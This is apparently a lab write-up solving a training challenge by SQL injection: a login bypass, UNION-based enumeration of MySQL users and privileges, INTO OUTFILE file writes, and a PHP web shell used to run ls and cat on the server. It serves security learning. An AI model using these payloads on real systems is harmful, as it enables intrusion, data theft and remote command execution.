---
description: >-
  Assess the web application and use a variety of techniques to gain remote code
  execution and find a flag in the / root directory of the file system. Submit
  the contents of the flag as your answer.
---

# Skills Assessment

<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

```sql
admin' or '1'='1
admin' or '1'='1'
admin' or '1'='1'--
admin' or '1'='1'-- -
```

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Luckly we didn't have to spend much time building up the payload, and with the `admin' or '1'='1'-- -` we manage to bypass the authentication page.

Now, the objective is to have access to root directory of the file system. Since we confirm the web application is vulnerable to SQL injection, let's try to exploit the search field with a single quote (`'`) and see if we got any errors.

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

The search field is also indeed vulnerable to SQL  Injection. What we can now try to do is try to find how many columns is the query accepting. We can try  `' ORDER BY  1-- -` and increasing the number until we get an error:

```sql
' ORDER BY 1-- -
```

<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

When we reach `' ORDER BY 6-- -` the message above is returned, so we can assume the DB has 5 columns.



<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

To prove our theory let's use the following query

```sql
' UNION select 1,2,3,4,5-- -
```

We got no errors and we got a new line

The number 1 is omitted. This may be the column used for the PRIMARY KEY, and in order to execute functions in our queries we must assure what column can return the information.



<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

```sql
' UNION select 1,@@version,3,4,5-- -
```

By placing the `@@version` in the column two, we now where to except the results to be returned.





Now, since our goal is to list a file in the root directory, we can skip listing the DB tables. Let's  check what is the current user and what kind of permissions that our current user has.

<figure><img src="../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

```sql
' UNION SELECT 1, user, 3, 4, 5 from mysql.user-- -
```

As we can see from the result abobe, the current user is root.



<figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

```sql
' UNION SELECT 1, super_priv, 3, 4, 5 from mysql.user-- -
```

To move to the next step, we must first ensure that our current user has superuser privileges. The 'Y' in column two confirms it.



<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Since we have superuser privileges, we should be fine writing into to the server. But if we try to write a file in 'var/www/html/' directory we'll get the "Permission denied" message, so what we should do is writing at the folder 'var/www/html/dashboard/'.

{% code overflow="wrap" %}
```sql
' UNION SELECT 1,'This is a test!', 3, 4, 5 INTO OUTFILE '/var/www/html/dashboard/test.txt'-- -
```
{% endcode %}

When accessing the `/dashboard/test.txt` we can see the output of the file we just created.



<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

Now that we confirmed we can successfully write files into the server, we can write a web shell in order to send commands to the server.

```sql
' UNION SELECT 1,'',3,4,5 INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -
```

When accessing the endpoint we must ensure we type `shell.php?0=[command]`.

<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

`http://SERVER_IP:PORT/dashboard/shell.php?0=ls`

&#x20;In this case, by using the `ls` command we can list the files of the current directory.

<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

`http://SERVER_IP:PORT/dashboard/shell.php?0=ls ../../../../../`

Navigating to the back using ls `../../../../../` we can see file that looks our flag.

<figure><img src="../../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

`http://SERVER_IP:PORT/dashboard/shell.php?0=cat ../../../../../flag_xxxxxxxxxxxx.txt`

Issuing the cat command we successfully found our flag!



This was a very insightful and fun section to complete. Hope this walk-through was helpful, see you on the next one!





















